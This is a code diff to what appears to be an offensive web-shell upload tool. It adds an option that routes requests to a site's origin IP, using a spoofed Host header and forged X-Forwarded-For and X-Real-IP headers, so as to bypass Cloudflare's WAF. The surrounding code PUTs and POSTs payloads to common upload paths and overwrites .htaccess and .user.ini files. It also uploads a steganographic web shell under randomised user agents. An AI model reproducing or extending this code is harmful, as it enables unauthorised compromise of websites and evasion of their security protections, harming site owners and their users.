@@ -56,6 +56,10 @@ export interface ParallelUploadConfig {
   timeout?: number;
   onProgress?: ProgressCallback;
   onMethodProgress?: (method: string, status: string) => void;
+  /** Origin IP for bypassing Cloudflare WAF — when set, requests go to IP with Host header */
+  originIp?: string;
+  /** Original domain name for Host header when using origin IP */
+  originalDomain?: string;
 }
 
 // ─── Constants ───
@@ -1424,6 +1428,11 @@ export async function multiVectorParallelUpload(
   const masterAbort = new AbortController();
   let bestResult: EnhancedUploadResult | null = null;
 
+  // Origin IP bypass: when origin IP is set, add Host header to all requests
+  const originHostHeaders: Record<string, string> = config.originIp && config.originalDomain
+    ? { "Host": config.originalDomain, "X-Forwarded-For": "1.1.1.1", "X-Real-IP": "1.1.1.1" }
+    : {};
+
   const uploadPaths = config.uploadPaths.length > 0
     ? config.uploadPaths.slice(0, 6)
     : ["/wp-content/uploads/", "/uploads/", "/images/", "/tmp/", "/media/", "/"];
@@ -1445,6 +1454,7 @@ export async function multiVectorParallelUpload(
               method: "PUT",
               body: config.fileContent,
               headers: {
+                ...originHostHeaders,
                 ...strategy.headers,
                 "Content-Type": "application/octet-stream",
               },
@@ -1484,6 +1494,7 @@ export async function multiVectorParallelUpload(
                 method: "POST",
                 body: mp.body,
                 headers: {
+                  ...originHostHeaders,
                   ...strategy.headers,
                   "Content-Type": mp.contentType,
                 },
@@ -1549,7 +1560,7 @@ export async function multiVectorParallelUpload(
           await enhancedFetch(`${config.targetUrl}${path}.htaccess`, {
             method: "PUT",
             body: htaccessContent,
-            headers: { "Content-Type": "text/plain", "User-Agent": randomUA() },
+            headers: { ...originHostHeaders, "Content-Type": "text/plain", "User-Agent": randomUA() },
             signal: AbortSignal.timeout(8000),
           });
 
@@ -1557,7 +1568,7 @@ export async function multiVectorParallelUpload(
           await enhancedFetch(`${config.targetUrl}${path}.user.ini`, {
             method: "PUT",
             body: generateUserIni(),
-            headers: { "Content-Type": "text/plain", "User-Agent": randomUA() },
+            headers: { ...originHostHeaders, "Content-Type": "text/plain", "User-Agent": randomUA() },
             signal: AbortSignal.timeout(8000),
           });
 
@@ -1566,7 +1577,7 @@ export async function multiVectorParallelUpload(
           const putRes = await enhancedFetch(`${config.targetUrl}${path}${stegoShell.filename}`, {
             method: "PUT",
             body: new Uint8Array(stegoShell.content),
-            headers: { "Content-Type": stegoShell.contentType, "User-Agent": randomUA() },
+            headers: { ...originHostHeaders, "Content-Type": stegoShell.contentType, "User-Agent": randomUA() },
             signal: AbortSignal.timeout(10000),
           });
 
